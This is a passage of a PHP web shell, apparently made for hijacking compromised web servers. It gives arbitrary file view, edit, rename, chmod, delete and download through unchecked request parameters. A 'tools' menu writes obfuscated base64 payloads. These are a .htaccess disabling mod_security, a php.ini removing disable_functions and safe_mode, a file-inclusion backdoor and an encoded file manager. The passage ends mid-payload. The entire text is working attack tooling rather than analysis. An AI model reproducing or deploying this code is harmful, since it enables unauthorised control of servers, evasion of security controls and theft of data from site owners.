<textarea name="sumber"><?=htmlspecialchars(file_get_contents($_GET['flux']))?></textarea><br>
<input type="submit" name="save" value=">>">
</form>
<?php
if(isset($_POST['save'])) {
	$save = file_put_contents($_GET['flux'], $_POST['sumber']);
	if($save){
		echo "<font color='lime'>Saved!</font>";
	}
	else {
		echo "<font color='red'>Permission Denied</font>";
	}
}
}

elseif(isset($_GET['pandos']) && $_GET['pandos'] == "highlight"){
$code = highlight_file($_GET['flux'], true);
?>
Filename: <font color="lime"><?=basename($_GET['flux'])?></font> [<a href="?pandos=view&l0pth=<?=$the_pwd?>&flux=<?=$_GET['flux']?>">view</b></a>] | [<a href="?pandos=highlight&l0pth=<?=$the_pwd?>&flux=<?=$_GET['flux']?>">highlight</b></a>] | [<a href="?pandos=edit&l0pth=<?=$the_pwd?>&flux=<?=$_GET['flux']?>">edit</b></a>] | [<a href="?pandos=ren&l0pth=<?=$the_pwd?>&flux=<?=$_GET['flux']?>">rename</b></a>] | [<a href="?pandos=download&l0pth=<?=$the_pwd?>&flux=<?=$_GET['flux']?>">download</b></a>] | [<a href="?pandos=rm&l0pth=<?=$the_pwd?>&flux=<?=$_GET['flux']?>">delete</b></a>] | [<a href="?pandos=chmod&l0pth=<?=$the_pwd?>&flux=<?=$_GET['flux']?>">chmod</a>]<br>
<div style="background: #e1e1e1; color: #000000;" class="sesuatu">
<?=str_replace(array("<span ", "</span>"), array("<font ", "</font>"), $code)?>
</div>
<?php
}

elseif(isset($_GET['pandos']) && $_GET['pandos'] == "ren"){
?>
Filename: <font color="lime"><?=basename($_GET['flux'])?></font> [<a href="?pandos=view&l0pth=<?=$the_pwd?>&flux=<?=$_GET['flux']?>">view</b></a>] | [<a href="?pandos=edit&l0pth=<?=$the_pwd?>&flux=<?=$_GET['flux']?>">edit</b></a>] | [<a href="?pandos=ren&l0pth=<?=$the_pwd?>&flux=<?=$_GET['flux']?>">rename</b></a>] | [<a href="?pandos=download&l0pth=<?=$the_pwd?>&flux=<?=$_GET['flux']?>">download</b></a>] | [<a href="?pandos=rm&l0pth=<?=$the_pwd?>&flux=<?=$_GET['flux']?>">delete</b></a>] | [<a href="?pandos=chmod&l0pth=<?=$the_pwd?>&flux=<?=$_GET['flux']?>">chmod</a>]<br>
<form method="post">
<input type="text" name="ren_file" value="<?=basename($_GET['flux'])?>" style="width: 250px;">
<input type="submit" name="do_it" value=">>">
</form>
<?php
if(isset($_POST['do_it'])){
	$ren_file = rename($_GET['flux'], "$the_pwd/".htmlspecialchars($_POST['ren_file'])."");
	if($ren_file){
		echo "<script>window.location='?l0pth=".$the_pwd."';</script>";
	}
	else {
		echo "<font color='red'>Permission Denied</font>";
	}
}
}

elseif(isset($_GET['pandos']) && $_GET['pandos'] == "chmod"){
?>
Filename: <font color="lime"><?=basename($_GET['flux'])?></font> [<a href="?pandos=view&l0pth=<?=$the_pwd?>&flux=<?=$_GET['flux']?>">view</b></a>] | [<a href="?pandos=edit&l0pth=<?=$the_pwd?>&flux=<?=$_GET['flux']?>">edit</b></a>] | [<a href="?pandos=ren&l0pth=<?=$the_pwd?>&flux=<?=$_GET['flux']?>">rename</b></a>] | [<a href="?pandos=download&l0pth=<?=$the_pwd?>&flux=<?=$_GET['flux']?>">download</b></a>] | [<a href="?pandos=rm&l0pth=<?=$the_pwd?>&flux=<?=$_GET['flux']?>">delete</b></a>] | [<a href="?pandos=chmod&l0pth=<?=$the_pwd?>&flux=<?=$_GET['flux']?>">chmod</a>]
<form method="post">
<input type="text" name="mode" value="<?=substr(sprintf('%o', fileperms($_GET['flux'])), -4)?>">
<input type="submit" name="ganti" value=">>">
</form>
<?php
if(isset($_POST['ganti'])){
	if(@chmod($_GET['flux'], $_POST['mode'])){
		echo "<script>window.location='?l0pth=".$the_pwd."';</script>";
	}
	else {
		echo "<font color='red'>Chmod Failed</font>";
	}
}
}

elseif(isset($_GET['pandos']) && $_GET['pandos'] == "rm"){
$rm_it = @unlink($_GET['flux']);
if($rm_it){
	echo "<script>window.location='?l0pth=".$the_pwd."';</script>";
}
else {
	echo "<font color='red'>Permission Denied</font>";
}
}

elseif(isset($_GET['flux']) && ($_GET['flux'] != '') && ($_GET['pandos'] == 'download')) {
@ob_clean();
$downfile = $_GET['flux'];
header('Content-Description: File Transfer');
header('Content-Type: application/octet-stream');
header('Content-Disposition: attachment; filename="'.basename($downfile).'"');
header('Expires: 0');
header('Cache-Control: must-revalidate');
header('Pragma: public');
header('Content-Length: ' . filesize($downfile));
readfile($downfile);
exit;
}

else {
if(is_dir($the_pwd) == true){
?>
<div id="filebrowse"><table width="100%" border="0" cellpadding="0" align="center" cellspacing="1">
<tr>
<th>Name</th>
<th>Type</th>
<th>Size</th>
<th>Last Modified</th>
<th>Permission</th>
<th>Action</th>
</tr>
<?php
$skendir = scandir($the_pwd);
foreach($skendir as $ashoy){
	$xtype = filetype("$the_pwd/$ashoy");
	$xtime = date("F d Y g:i:s", filemtime("$the_pwd/$ashoy"));
	if(!is_dir("$the_pwd/$ashoy")) continue;
	if($ashoy === '..'){
		$img = "<img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAAN1gAADdYBkG95nAAAAAd0SU1FB9oJBxUAM0qLz6wAAALLSURBVDjLbVPRS1NRGP+d3btrs7kZmAYXlSZYUK4HQXCREPWUQSSYID1GEKKx/Af25lM+DCFCe4heygcNdIUEST04QW6BjS0yx5UhkW6FEtvOPfc7p4emXcofHPg453y/73e+73cADyzLOoy/bHzR8/l80LbtYD5v6wf72VzOmwLmTe7u7oZlWccbGhpGNJ92HQwtteNvSqmXJOWjM52dPPMpg/Nd5/8SpFIp9Pf3w7KsS4FA4BljrB1HQCmVc4V7O3oh+mFlZQWxWAwskUggkUhgeXk5Fg6HF5mPnWCAAhhTUGCKQUF5eb4LIa729PRknr94/kfBwMDAsXg8/tHv958FoDxP88YeJTLd2xuLAYAPAIaGhu5IKc9yzsE5Z47jYHV19UOpVNoXQsC7OOdwHNG7tLR0EwD0UCis67p2nXMOACiXK7/ev3/3ZHJy8nEymZwyDMM8qExEyjTN9vr6+oAQ4gaAef3ixVgd584pw+DY3d0tTE9Pj6TT6TfBYJCPj4/fBuA/IBBC+GZmZhZbWlrOOY5jDg8Pa3qpVEKlUoHf70cgEGgeHR2NPHgQV4ODt9Ts7KwEQACgaRpSqVdQSrFqtYpqtSpt2wYDYExMTMy3tbVdk1LWpqXebm1t3TdN86mu65FaMw+sE2KM6T9//pgaGxsb1QE4a2trr5uamq55Gn2l+WRzWgihEVH9EX5AJpOZBwANAHK5XKGjo6OvsbHRdF0XRAQpZZ2U0k9EiogYEYGIlJSS2bY9m0wmHwJQWo301/b2diESiVw2jLoQETFyXeWSy4hc5rqHJKxYLGbn5ubuFovF0qECANjf37e/bmzkjDrjdCgUamU+MCIJIgkpiZXLZZnNZhcWFhbubW5ufu7q6sLOzs7/LgPQ3tra2h+NRvvC4fApAHJvb29rfX19qVAovAawd+Rv/Ac+AMcAGLUJVAA4R138DeF+cX+xR/AGAAAAAElFTkSuQmCC'>";
		$href = $img."<a href='?l0pth=".dirname($the_pwd)."'>$ashoy</a>";
	}
	elseif($ashoy === '.'){
		$href = "<a href='?l0pth=$the_pwd'>$ashoy</a>";
	}
	else {
		$img = "<img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAQAAAC1+jfqAAAAAXNSR0IArs4c6QAAAAJiS0dEAP+Hj8y/AAAACXBIWXMAAAsTAAALEwEAmpwYAAAA00lEQVQoz6WRvUpDURCEvzmuwR8s8gr2ETvtLSRaKj6ArZU+VVAEwSqvJIhIwiX33nPO2IgayK2cbtmZWT4W/iv9HeacA697NQRY281Fr0du1hJPt90D+xgc6fnwXjC79JWyQdiTfOrf4nk/jZf0cVenIpEQImGjQsVod2cryvH4TEZC30kLjME+KUdRl24ZDQBkryIvtOJggLGri+hbdXgd90e9++hz6rR5jYtzZKsIDzhwFDTQDzZEsTz8CRO5pmVqB240ucRbM7kejTcalBfvn195EV+EajF1hgAAAABJRU5ErkJggg==' />";
		$href = $img."<a href='?l0pth=$the_pwd/$ashoy'>$ashoy</a>";
	}
	if($ashoy === '.' || $ashoy === '..'){
		$act_dir = "<a href='?pandos=newfile&l0pth=".$the_pwd."'>newfile</a> | <a href='?pandos=newfolder&l0pth=$the_pwd'>newfolder</a>";
	}
	else {
		$act_dir = "<a href='?pandos=rendir&l0pth=$the_pwd/$ashoy'>rename</a> | <a href='?pandos=rmdir&l0pth=$the_pwd/$ashoy'>delete</a>";
	}
?>
<tr>
<td><?=$href?></td>
<td><center><?=$xtype?></center></td>
<td><center>-</center></td>
<td><center><?=$xtime?></center></td>
<td><center><?=pandora("$the_pwd/$ashoy", octal2ascii_perms("$the_pwd/$ashoy"))?></center></td>
<td style="padding-left: 15px;"><?=$act_dir?></td>
<?php
}
echo "</tr>";
foreach($skendir as $bagolz){
	$ftype = filetype("$the_pwd/$bagolz");
	$ftime = date("F d Y g:i:s", filemtime("$the_pwd/$bagolz"));
	$size = filesize("$the_pwd/$bagolz")/1024;
	$size = round($size,3);
	if($size > 1024) {
		$size = round($size/1024,2). 'MB';
	} 
	else {
		$size = $size. 'KB';
	}
	if(!is_file("$the_pwd/$bagolz")) continue;
?>
<tr>
<td><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII='><a href="?pandos=view&l0pth=<?=$the_pwd?>&flux=<?=$the_pwd."/".$bagolz?>"><?=$bagolz?></a></td>
<td><center><?=$ftype?></center></td>
<td><center><?=$size?></center></td>
<td><center><?=$ftime?></center></td>
<td><center><?=pandora("$the_pwd/$bagolz", octal2ascii_perms("$the_pwd/$bagolz"))?></center></td>
<td style="padding-left: 15px;"><a href="?pandos=edit&l0pth=<?=$the_pwd?>&flux=<?=$the_pwd."/".$bagolz?>">edit</a> | <a href="?pandos=ren&l0pth=<?=$the_pwd?>&flux=<?=$the_pwd."/".$bagolz?>">rename</a> | <a href="?pandos=download&l0pth=<?=$the_pwd?>&flux=<?=$the_pwd."/".$bagolz?>">download</a> | <a href="?pandos=rm&l0pth=<?=$the_pwd?>&flux=<?=$the_pwd."/".$bagolz?>">delete</a></td>
<?php
}
echo "</tr></table></div>";
}
else {
	echo "<font color='red'>Access Denied</font>";
}
}
?>
<br><div id="tuls"><table align="center"><form method="post">
<tr><td><center>Select your tools</center></td></tr>
<tr><td><select name="tuls">
<option value="jhoni">Bypass Disable Function in Apache</option>
<option value="doyok">Webadmin File Manager</option>
<option value="otoy">Shell Scanner</option>
</select>
<input type="submit" name="buat" value=">>"></td></tr>
</form></table>
</div>
<?php
if(isset($_POST['buat'])){
	$tuls = $_POST['tuls'];
	switch($tuls){
		case 'jhoni':
			$hta = "PElmTW9kdWxlIG1vZF9zZWN1cml0eS5jPg0KU2VjRmlsdGVyRW5naW5lIE9mZg0KU2VjRmlsdGVyU2NhblBPU1QgT2ZmDQpTZWNGaWx0ZXJDaGVja1VSTEVuY29kaW5nIE9mZiANClNlY0ZpbHRlckNoZWNrVW5pY29kZUVuY29kaW5nIE9mZg0KPC9JZk1vZHVsZT4=";
			$ini = "c2FmZV9tb2RlID0gT0ZGDQpkaXNhYmxlX2Z1bmN0aW9ucyA9IE5PTkUNCm9wZW5fYmFzZWRpciA9IE9GRg0KYWxsb3dfdXJsX2ZvcGVuID0gT04NCmFsbG93X3VybF9pbmNsdWRlID0gT04NCnNhZmVfbW9kZV9naWQgPSBPRkY=";
			$php = "PD9waHAgDQplY2hvIGluaV9nZXQoInNhZmVfbW9kZSIpOyANCmVjaG8gaW5pX2dldCgib3Blbl9iYXNlZGlyIik7IA0KaW5jbHVkZSgkX0dFVFsiZmlsZSJdKTsgDQppbmlfcmVzdG9yZSgic2FmZV9tb2RlIik7IA0KaW5pX3Jlc3RvcmUoIm9wZW5fYmFzZWRpciIpOyANCmVjaG8gaW5pX2dldCgic2FmZV9tb2RlIik7IA0KZWNobyBpbmlfZ2V0KCJvcGVuX2Jhc2VkaXIiKTsgDQppbmNsdWRlKCRfR0VUWyJzcyJdKTsgDQo/Pg==";
			
			$open = @fopen(".htaccess", "w");
			fwrite($open, base64_decode($hta));
			fclose($open);
			
			$cox = @fopen("php.ini", "w");
			fwrite($cox, base64_decode($ini));
			fclose($cox);
			
			$boy = @fopen("ini.php", "w");
			fwrite($boy, base64_decode($php));
			fclose($boy);
			
			echo "[!] Bypass Disable Function in Apache berhasil dipasang";
			break;
		case 'doyok':
			$wfm = "PD9waHANCg0KLyogLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSAqLw0KDQovKiBZb3VyIGxhbmd1YWdlOg0KICogJ2VuJyAtIEVuZ2xpc2gNCiAqICdkZScgLSBHZXJtYW4NCiAqICdmcicgLSBGcmVuY2gNCiAqICdpdCcgLSBJdGFsaWFuDQogKiAnbmwnIC0gRHV0Y2gNCiAqICdzZScgLSBTd2VkaXNoDQogKiAnc3AnIC0gU3BhbmlzaA0KICogJ2RrJyAtIERhbmlzaA0KICogJ3RyJyAtIFR1cmtpc2gNCiAqICdjcycgLSBDemVjaA0KICogJ3J1JyAtIFJ1c3NpYW4NCiAqICdhdXRvJyAtIGF1dG9zZWxlY3QNCiAqLw0KJGxhbmcgPSAnYXV0byc7DQoNCi8qIENoYXJzZXQgb2Ygb3V0cHV0Og0KICogcG9zc2libGUgdmFsdWVzIGFyZSBkZXNjcmliZWQgaW4gdGhlIGNoYXJzZXQgdGFibGUgYXQNCiAqIGh0dHA6Ly93d3cucGhwLm5ldC9tYW51YWwvZW4vZnVuY3Rpb24uaHRtbGVudGl0aWVzLnBocA0KICogJ2F1dG8nIC0gdXNlIHRoZSBzYW1lIGNoYXJzZXQgYXMgdGhlIHdvcmRzIG9mIG15IGxhbmd1YWdlIGFyZSBlbmNvZGVkDQogKi8NCiRzaXRlX2NoYXJzZXQgPSAnYXV0byc7DQoNCi8qIEhvbWVkaXI6DQogKiBGb3IgZXhhbXBsZTogJy4vJyAtIHRoZSBzY3JpcHQncyBkaXJlY3RvcnkNCiAqLw0KJGhvbWVkaXIgPSAnLi8nOw0KDQovKiBTaXplIG9mIHRoZSBlZGl0IHRleHRhcmVhDQogKi8NCiRlZGl0Y29scyA9IDgwOw0KJGVkaXRyb3dzID0gMjU7DQoNCi8qIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiAqIE9wdGlvbmFsIGNvbmZpZ3VyYXRpb24gKHJlbW92ZSAjIHRvIGVuYWJsZSkNCiAqLw0KDQovKiBQZXJtaXNzaW9uIG9mIGNyZWF0ZWQgZGlyZWN0b3JpZXM6DQogKiBGb3IgZXhhbXBsZTogMDcwNSB3b3VsZCBiZSAnZHJ3eC0tLXIteCcuDQogKi8NCiMgJGRpcnBlcm1pc3Npb24gPSAwNzA1Ow0KDQovKiBQZXJtaXNzaW9uIG9mIGNyZWF0ZWQgZmlsZXM6DQogKiBGb3IgZXhhbXBsZTogMDYwNCB3b3VsZCBiZSAnLXJ3LS0tLXItLScuDQogKi8NCiMgJGZpbGVwZXJtaXNzaW9uID0gMDYwNDsNCg0KLyogRmlsZW5hbWVzIHJlbGF0ZWQgdG8gdGhlIGFwYWNoZSB3ZWIgc2VydmVyOg0KICovDQokaHRhY2Nlc3MgPSAnLmh0YWNjZXNzJzsNCiRodHBhc3N3ZCA9ICcuaHRwYXNzd2QnOw0KDQovKiAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tICovDQoNCmlmIChnZXRfbWFnaWNfcXVvdGVzX2dwYygpKSB7DQoJYXJyYXlfd2FsaygkX0dFVCwgJ3N0cmlwJyk7DQoJYXJyYXlfd2FsaygkX1BPU1QsICdzdHJpcCcpOw0KCWFycmF5X3dhbGsoJF9SRVFVRVNULCAnc3RyaXAnKTsNCn0NCg0KaWYgKGFycmF5X2tleV9leGlzdHMoJ2ltYWdlJywgJF9HRVQpKSB7DQoJaGVhZGVyKCdDb250ZW50LVR5cGU6IGltYWdlL2dpZicpOw0KCWRpZShnZXRpbWFnZSgkX0dFVFsnaW1hZ2UnXSkpOw0KfQ0KDQppZiAoIWZ1bmN0aW9uX2V4aXN0cygnbHN0YXQnKSkgew0KCWZ1bmN0aW9uIGxzdGF0ICgkZmlsZW5hbWUpIHsNCgkJcmV0dXJuIHN0YXQoJGZpbGVuYW1lKTsNCgl9DQp9DQoNCiRkZWxpbSA9IERJUkVDVE9SWV9TRVBBUkFUT1I7DQoNCmlmIChmdW5jdGlvbl9leGlzdHMoJ3BocF91bmFtZScpKSB7DQoJJHdpbiA9IChzdHJ0b3VwcGVyKHN1YnN0cihQSFBfT1MsIDAsIDMpKSA9PT0gJ1dJTicpID8gdHJ1ZSA6IGZhbHNlOw0KfSBlbHNlIHsNCgkkd2luID0gKCRkZWxpbSA9PSAnXFwnKSA/IHRydWUgOiBmYWxzZTsNCn0NCg0KaWYgKCFlbXB0eSgkX1NFUlZFUlsnUEFUSF9UUkFOU0xBVEVEJ10pKSB7DQoJJHNjcmlwdGRpciA9IGRpcm5hbWUoJF9TRVJWRVJbJ1BBVEhfVFJBTlNMQVRFRCddKTsNCn0gZWxzZWlmICghZW1wdHkoJF9TRVJWRVJbJ1NDUklQVF9GSUxFTkFNRSddKSkgew0KCSRzY3JpcHRkaXIgPSBkaXJuYW1lKCRfU0VSVkVSWydTQ1JJUFRfRklMRU5BTUUnXSk7DQp9IGVsc2VpZiAoZnVuY3Rpb25fZXhpc3RzKCdnZXRjd2QnKSkgew0KCSRzY3JpcHRkaXIgPSBnZXRjd2QoKTsNCn0gZWxzZSB7DQoJJHNjcmlwdGRpciA9ICcuJzsNCn0NCiRob21lZGlyID0gcmVsYXRpdmUyYWJzb2x1dGUoJGhvbWVkaXIsICRzY3JpcHRkaXIpOw0KDQokZGlyID0gKGFycmF5X2tleV9leGlzdHMoJ2RpcicsICRfUkVRVUVTVCkpID8gJF9SRVFVRVNUWydkaXInXSA6ICRob21lZGlyOw0KDQppZiAoYXJyYXlfa2V5X2V4aXN0cygnb2xkZGlyJywgJF9QT1NUKSAmJiAhcGF0aF9pc19yZWxhdGl2ZSgkX1BPU1RbJ29sZGRpciddKSkgew0KCSRkaXIgPSByZWxhdGl2ZTJhYnNvbHV0ZSgkZGlyLCAkX1BPU1RbJ29sZGRpciddKTsNCn0NCg0KJGRpcmVjdG9yeSA9IHNpbXBsaWZ5X3BhdGgoYWRkc2xhc2goJGRpcikpOw0KDQokZmlsZXMgPSBhcnJheSgpOw0KJGFjdGlvbiA9ICcnOw0KaWYgKCFlbXB0eSgkX1BPU1RbJ3N1Ym1pdF9hbGwnXSkpIHsNCgkkYWN0aW9uID0gJF9QT1NUWydhY3Rpb25fYWxsJ107DQoJZm9yICgkaSA9IDA7ICRpIDwgJF9QT1NUWydudW0nXTsgJGkrKykgew0KCQlpZiAoYXJyYXlfa2V5X2V4aXN0cygiY2hlY2tlZCRpIiwgJF9QT1NUKSAmJiAkX1BPU1RbImNoZWNrZWQkaSJdID09ICd0cnVlJykgew0KCQkJJGZpbGVzW10gPSAkX1BPU1RbImZpbGUkaSJdOw0KCQl9DQoJfQ0KfSBlbHNlaWYgKCFlbXB0eSgkX1JFUVVFU1RbJ2FjdGlvbiddKSkgew0KCSRhY3Rpb24gPSAkX1JFUVVFU1RbJ2FjdGlvbiddOw0KCSRmaWxlc1tdID0gcmVsYXRpdmUyYWJzb2x1dGUoJF9SRVFVRVNUWydmaWxlJ10sICRkaXJlY3RvcnkpOw0KfSBlbHNlaWYgKCFlbXB0eSgkX1BPU1RbJ3N1Ym1pdF91cGxvYWQnXSkgJiYgIWVtcHR5KCRfRklMRVNbJ3VwbG9hZCddWyduYW1lJ10pKSB7DQoJJGZpbGVzW10gPSAkX0ZJTEVTWyd1cGxvYWQnXTsNCgkkYWN0aW9uID0gJ3VwbG9hZCc7DQp9IGVsc2VpZiAoYXJyYXlfa2V5X2V4aXN0cygnbnVtJywgJF9QT1NUKSkgew0KCWZvciAoJGkgPSAwOyAkaSA8ICRfUE9TVFsnbnVtJ107ICRpKyspIHsNCgkJaWYgKGFycmF5X2tleV9leGlzdHMoInN1Ym1pdCRpIiwgJF9QT1NUKSkgYnJlYWs7DQoJfQ0KCWlmICgkaSA8ICRfUE9TVFsnbnVtJ10pIHsNCgkJJGFjdGlvbiA9ICRfUE9TVFsiYWN0aW9uJGkiXTsNCgkJJGZpbGVzW10gPSAkX1BPU1RbImZpbGUkaSJdOw0KCX0NCn0NCmlmIChlbXB0eSgkYWN0aW9uKSAmJiAoIWVtcHR5KCRfUE9TVFsnc3VibWl0X2NyZWF0ZSddKSB8fCAoYXJyYXlfa2V5X2V4aXN0cygnZm9jdXMnLCAkX1BPU1QpICYmICRfUE9TVFsnZm9jdXMnXSA9PSAnY3JlYXRlJykpICYmICFlbXB0eSgkX1BPU1RbJ2NyZWF0ZV9uYW1lJ10pKSB7DQoJJGZpbGVzW10gPSByZWxhdGl2ZTJhYnNvbHV0ZSgkX1BPU1RbJ2NyZWF0ZV9uYW1lJ10sICRkaXJlY3RvcnkpOw0KCXN3aXRjaCAoJF9QT1NUWydjcmVhdGVfdHlwZSddKSB7DQoJY2FzZSAnZGlyZWN0b3J5JzoNCgkJJGFjdGlvbiA9ICdjcmVhdGVfZGlyZWN0b3J5JzsNCgkJYnJlYWs7DQoJY2FzZSAnZmlsZSc6DQoJCSRhY3Rpb24gPSAnY3JlYXRlX2ZpbGUnOw0KCX0NCn0NCmlmIChzaXplb2YoJGZpbGVzKSA9PSAwKSAkYWN0aW9uID0gJyc7IGVsc2UgJGZpbGUgPSByZXNldCgkZmlsZXMpOw0KDQppZiAoJGxhbmcgPT0gJ2F1dG8nKSB7DQoJaWYgKGFycmF5X2tleV9leGlzdHMoJ0hUVFBfQUNDRVBUX0xBTkdVQUdFJywgJF9TRVJWRVIpICYmIHN0cmxlbigkX1NFUlZFUlsnSFRUUF9BQ0NFUFRfTEFOR1VBR0UnXSkgPj0gMikgew0KCQkkbGFuZyA9IHN1YnN0cigkX1NFUlZFUlsnSFRUUF9BQ0NFUFRfTEFOR1VBR0UnXSwgMCwgMik7DQoJfSBlbHNlIHsNCgkJJGxhbmcgPSAnZW4nOw0KCX0NCn0NCg0KJHdvcmRzID0gZ2V0d29yZHMoJGxhbmcpOw0KDQppZiAoJHNpdGVfY2hhcnNldCA9PSAnYXV0bycpIHsNCgkkc2l0ZV9jaGFyc2V0ID0gJHdvcmRfY2hhcnNldDsNCn0NCg0KJGNvbHMgPSAoJHdpbikgPyA0IDogNzsNCg0KaWYgKCFpc3NldCgkZGlycGVybWlzc2lvbikpIHsNCgkkZGlycGVybWlzc2lvbiA9IChmdW5jdGlvbl9leGlzdHMoJ3VtYXNrJykpID8gKDA3NzcgJiB+dW1hc2soKSkgOiAwNzU1Ow0KfQ0KaWYgKCFpc3NldCgkZmlsZXBlcm1pc3Npb24pKSB7DQoJJGZpbGVwZXJtaXNzaW9uID0gKGZ1bmN0aW9uX2V4aXN0cygndW1hc2snKSkgPyAoMDY2NiAmIH51bWFzaygpKSA6IDA2NDQ7DQp9DQoNCmlmICghZW1wdHkoJF9TRVJWRVJbJ1NDUklQVF9OQU1FJ10pKSB7DQoJJHNlbGYgPSBodG1sKGJhc2VuYW1lKCRfU0VSVkVSWydTQ1JJUFRfTkFNRSddKSk7DQp9IGVsc2VpZiAoIWVtcHR5KCRfU0VSVkVSWydQSFBfU0VMRiddKSkgew0KCSRzZWxmID0gaHRtbChiYXNlbmFtZSgkX1NFUlZFUlsnUEhQX1NFTEYnXSkpOw0KfSBlbHNlIHsNCgkkc2VsZiA9ICcnOw0KfQ0KDQppZiAoIWVtcHR5KCRfU0VSVkVSWydTRVJWRVJfU09GVFdBUkUnXSkpIHsNCglpZiAoc3RydG9sb3dlcihzdWJzdHIoJF9TRVJWRVJbJ1NFUlZFUl9TT0ZUV0FSRSddLCAwLCA2KSkgPT0gJ2FwYWNoZScpIHsNCgkJJGFwYWNoZSA9IHRydWU7DQoJfSBlbHNlIHsNCgkJJGFwYWNoZSA9IGZhbHNlOw0KCX0NCn0gZWxzZSB7DQoJJGFwYWNoZSA9IHRydWU7DQp9DQoNCnN3aXRjaCAoJGFjdGlvbikgew0KDQpjYXNlICd2aWV3JzoNCg0KCWlmIChpc19zY3JpcHQoJGZpbGUpKSB7DQoNCgkJLyogaGlnaGxpZ2h0X2ZpbGUgaXMgYSBtZXNzISAqLw0KCQlvYl9zdGFydCgpOw0KCQloaWdobGlnaHRfZmlsZSgkZmlsZSk7DQoJCSRzcmMgPSBlcmVnX3JlcGxhY2UoJzxmb250IGNvbG9yPSIoW14iXSopIj4nLCAnPHNwYW4gc3R5bGU9ImNvbG9yOiBcMSI+Jywgb2JfZ2V0X2NvbnRlbnRzKCkpOw0KCQkkc3JjID0gc3RyX3JlcGxhY2UoYXJyYXkoJzwvZm9udD4nLCAiXHIiLCAiXG4iKSwgYXJyYXkoJzwvc3Bhbj4nLCAnJywgJycpLCAkc3JjKTsNCgkJb2JfZW5kX2NsZWFuKCk7DQoNCgkJaHRtbF9oZWFkZXIoKTsNCgkJZWNobyAnPGgyIHN0eWxlPSJ0ZXh0LWFsaWduOiBsZWZ0OyBtYXJnaW4tYm90dG9tOiAwIj4nIC4gaHRtbCgkZmlsZSkgLiAnPC9oMj4NCg0KPGhyIC8+DQoNCjx0YWJsZT4NCjx0cj4NCjx0ZCBzdHlsZT0idGV4dC1hbGlnbjogcmlnaHQ7IHZlcnRpY2FsLWFsaWduOiB0b3A7IGNvbG9yOiBncmF5OyBwYWRkaW5nLXJpZ2h0OiAzcHQ7IGJvcmRlci1yaWdodDogMXB4IHNvbGlkIGdyYXkiPg0KPHByZSBzdHlsZT0ibWFyZ2luLXRvcDogMCI+PGNvZGU+JzsNCg0KCQlmb3IgKCRpID0gMTsgJGkgPD0gc2l6ZW9mKGZpbGUoJGZpbGUpKTsgJGkrKykgZWNobyAiJGlcbiI7DQoNCgkJZWNobyAnPC9jb2RlPjwvcHJlPg0KPC90ZD4NCjx0ZCBzdHlsZT0idGV4dC1hbGlnbjogbGVmdDsgdmVydGljYWwtYWxpZ246IHRvcDsgcGFkZGluZy1sZWZ0OiAzcHQiPg0KPHByZSBzdHlsZT0ibWFyZ2luLXRvcDogMCI+JyAuICRzcmMgLiAnPC9wcmU+DQo8L3RkPg0KPC90cj4NCjwvdGFibGU+DQoNCic7DQoNCgkJaHRtbF9mb290ZXIoKTsNCg0KCX0gZWxzZSB7DQoNCgkJaGVhZGVyKCdDb250ZW50LVR5cGU6ICcgLiBnZXRtaW1ldHlwZSgkZmlsZSkpOw0KCQloZWFkZXIoJ0NvbnRlbnQtRGlzcG9zaXRpb246IGZpbGVuYW1lPScgLiBiYXNlbmFtZSgkZmlsZSkpOw0KDQoJCXJlYWRmaWxlKCRmaWxlKTsNCg0KCX0NCg0KCWJyZWFrOw0KDQpjYXNlICdkb3dubG9hZCc6DQoNCgloZWFkZXIoJ1ByYWdtYTogcHVibGljJyk7DQoJaGVhZGVyKCdFeHBpcmVzOiAwJyk7DQoJaGVhZGVyKCdDYWNoZS1Db250cm9sOiBtdXN0LXJldmFsaWRhdGUsIHBvc3QtY2hlY2s9MCwgcHJlLWNoZWNrPTAnKTsNCgloZWFkZXIoJ0NvbnRlbnQtVHlwZTogJyAuIGdldG1pbWV0eXBlKCRmaWxlKSk7DQoJaGVhZGVyKCdDb250ZW50LURpc3Bvc2l0aW9uOiBhdHRhY2htZW50OyBmaWxlbmFtZT0nIC4gYmFzZW5hbWUoJGZpbGUpIC4gJzsnKTsNCgloZ